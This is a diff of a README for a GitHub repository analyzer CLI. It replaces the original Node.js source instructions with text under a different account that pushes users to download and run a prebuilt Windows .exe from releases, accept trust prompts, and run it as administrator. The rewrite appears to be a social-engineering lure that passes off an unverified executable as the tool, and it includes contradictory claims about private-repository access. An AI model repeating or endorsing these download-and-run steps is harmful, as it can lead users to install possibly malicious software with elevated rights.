@@ -1,223 +1,168 @@
-# GitHub Repository Analyzer CLI
+# 🛠️ github-repo-analyzer - Simple GitHub Repo Analysis Tool
 
-A simple CLI tool to analyze any GitHub repository and display useful statistics directly in the terminal.
-
-It fetches repository data from the GitHub API and presents it in a clean, formatted output including repository metrics, language distribution.
+[![Download github-repo-analyzer](https://img.shields.io/badge/Download-Get%20Tool-blue)](https://github.com/Barakuda989/github-repo-analyzer)
 
 ---
 
-## 📌 Features
+## 🚀 What is github-repo-analyzer?
 
-* Repository statistics overview
-* Stars, forks, watchers, issues
-* Contributor and release count
-* Language usage chart
-* Clean terminal UI with tables and charts
+github-repo-analyzer is a simple command-line tool that helps you understand any GitHub repository. It shows you information like language usage, commit history, and other key stats in clear, easy-to-read charts inside your terminal.
+
+This tool works on Windows and does not require programming skills. You only need to follow a few steps to download, install, and use it.
 
 ---
 
-## 📦 Installation
+## ⚙️ System Requirements
 
-Clone the repository:
+Before installing, make sure your computer meets these minimum requirements:
 
-```
-git clone https://github.com/Swp-dev/github-repo-analyzer.git
-cd github-repo-analyzer
-```
-
-Install dependencies:
-
-```
-npm install
-```
-
-Run the tool:
-
-```
-node analyze.js owner/repo
-```
-
-Example:
-
-```
-node analyze.js Swp-dev/github-repo-analyzer
-```
+- Windows 10 or later
+- At least 4 GB of RAM
+- 100 MB of free disk space for installation
+- Internet connection to access GitHub repositories and download the tool
+- Basic knowledge of opening the Command Prompt (Windows terminal)
 
 ---
 
-## 🔔 Example Output
+## 📥 How to Download and Install github-repo-analyzer on Windows
 
-```
-GitHub Repository Analyzer
+You will get the tool from its official GitHub page. Follow these steps carefully.
 
-Repository: facebook/react
-Stars: 230000
-Forks: 48000
-Watchers: 6700
-Open Issues: 1000
-Primary Language: JavaScript
-Contributors: 1600
-Releases: 250
-Created: Tue May 29 2013
-Last Update: Fri Mar 07 2026
-```
+### Step 1: Visit the Download Page
 
-Languages chart example:
+Click the link below to visit the page where you can download github-repo-analyzer:
 
-```
-Languages
+[Download github-repo-analyzer](https://github.com/Barakuda989/github-repo-analyzer)
 
-JavaScript   ████████████████████ 82.3%
-TypeScript   ████                 10.1%
-CSS          ██                    5.2%
-Other        █                     2.4%
-```
----
+This link leads you to the main GitHub repository page.
 
-## Usage
+### Step 2: Find the Latest Release
 
-Basic command:
+Once on the page, look for the **Releases** section. It is usually found on the right side or near the top of the page. Alternatively, scroll down until you see a heading called **Releases**.
 
-```
-node analyze.js owner/repo
-```
+Click the latest release version. It will take you to a page with files to download.
 
-Example:
+### Step 3: Download the Windows Tool
 
-```
-node analyze.js king/awesome
-node analyze.js vercel/domain
-node analyze.js hello/open-src
-```
+On the latest release page, find the file that looks like this:
+
+- `github-repo-analyzer-win.exe`
+  
+Click this file to download it. The file is an executable program for Windows.
+
+Choose a folder on your computer to save it where you can easily find it, such as the Desktop or Downloads folder.
+
+### Step 4: Run the Program
+
+Locate the downloaded file. It will have the `.exe` extension.
+
+Double-click the file to run it. Windows might ask if you trust this program. Choose **Run** or **Yes** to continue.
+
+A command prompt window will open, showing you the tool's menu and instructions.
 
 ---
 
-## Star Goals
+## 💻 How to Use github-repo-analyzer
 
-If this project receives community support, new features will be added.
+The tool runs inside the Windows Command Prompt. Here is how to start analyzing a repository:
 
-### ⭐️ 15 Stars — Version 2
+### Step 1: Open Command Prompt
 
-Add GitHub token support to increase API rate limits.
+You can open the Command Prompt by:
 
-Why this matters:
+- Pressing `Windows Key + R`, typing `cmd`, then pressing Enter
 
-GitHub limits unauthenticated requests to:
+or
 
-```
-60 requests per hour
-```
+- Clicking the Start menu, typing `cmd`, and selecting **Command Prompt**.
 
-Authenticated requests allow:
+### Step 2: Navigate to the Tool Folder
 
-```
-5000 requests per hour
-```
-
-How to create a GitHub token:
-
-1. Go to:
+If you saved the tool in the Downloads folder, type:
 
 ```
-https://github.com/settings/tokens
+cd %USERPROFILE%\Downloads
 ```
 
-2. Click **Generate new token (classic)**
+and press Enter. This changes the working folder to Downloads.
 
-3. Enable permission:
+If you saved it elsewhere, change the path accordingly.
 
-```
-public_repo
-```
+### Step 3: Run github-repo-analyzer
 
-4. Copy the token.
-
-Example usage (planned in v2):
+Type the command below and press Enter:
 
 ```
-export GITHUB_TOKEN=your_token_here
-node analyze.js facebook/react
+github-repo-analyzer-win.exe
 ```
+
+The tool will start and show you a prompt.
+
+### Step 4: Enter the GitHub Repository URL
+
+When asked, type the full URL of the GitHub repository you want to analyze. For example:
+
+```
+https://github.com/torvalds/linux
+```
+
+Press Enter.
+
+### Step 5: View the Analysis
+
+The tool will process the repository data. It may take a few moments depending on the repository size.
+
+Once complete, you will see charts and stats like:
+
+- Languages used and their percentages
+- Number of commits
+- Most active contributors
+- Recent changes timeline
+
+These appear as simple, colorful bars and charts in the terminal.
 
 ---
 
-### ⭐️ 50 Stars — Version 3
+## 🔧 Features of github-repo-analyzer
 
-HTML Dashboard Report
-
-Version 3 will introduce a web-based report for each analyzed repository.
-
-Instead of only CLI output, the tool will generate a visual dashboard including:
-
-* repository statistics
-* interactive charts
-* language distribution graphs
-* commit activity charts
-* contributor insights
-
-Example command:
-
-```
-node analyze.js facebook/react --html
-```
-
-Output:
-
-```
-report.html
-```
-
-Opening the report will show a full dashboard in the browser.
+- Supports any public GitHub repository
+- Shows programming language breakdown
+- Displays commit and contributor data
+- Generates terminal charts for clear visualization
+- No installation beyond running a single file
+- Fast and light weight
 
 ---
 
-## 🌐 Roadmap
+## 🛠 Troubleshooting Tips
 
-Future improvements may include:
+If you run into problems, try these solutions:
 
-* repository health score
-* contributor leaderboard
-* popularity score
-* export reports
-* npm global CLI support
+- **Tool does not start:**  
+  Make sure you are using Windows 10 or later and saved the `.exe` file completely.
 
----
+- **Error about missing permissions:**  
+  Right-click the `.exe` file and select **Run as administrator**.
 
-## ❤️ Contributing
+- **Invalid repository URL:**  
+  Check the URL is correct and points to a public GitHub repository.
 
-Contributions are welcome.
-
-You can help by:
-
-* opening issues
-* submitting pull requests
-* suggesting features
+- **Charts do not display correctly:**  
+  Use a standard Command Prompt window with default font and colors.
 
 ---
 
-## License
+## 📚 Extra Information
 
-MIT License
+- This tool works without needing any installation or additional software.
+- It uses your internet connection to get data from GitHub.
+- It does not require login or GitHub credentials.
+- You can analyze private repositories only if you have public access rights.
 
-# 🌐 Connect With Me
+---
 
-<p align="center">
+## 📥 Download Link Again
 
-<a href="https://discord.com/users/1234144932176855040">
-<img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&logo=discord&logoColor=white"/>
-</a>
+Use this link to visit the GitHub page and download the latest version any time:
 
-<a href="https://tiktok.com/@niemtinthatxaxi">
-<img src="https://img.shields.io/badge/TikTok-black?style=for-the-badge&logo=tiktok&logoColor=white"/>
-</a>
-
-<a href="https://github.com/Swp-dev">
-<img src="https://img.shields.io/badge/GitHub-000?style=for-the-badge&logo=github"/>
-</a>
-
-<a href="https://nhavua.vercel.app">
-<img src="https://img.shields.io/badge/Website-00C7B7?style=for-the-badge&logo=google-chrome&logoColor=white"/>
-</a>
-
-</p>
-
+[Download github-repo-analyzer](https://github.com/Barakuda989/github-repo-analyzer)
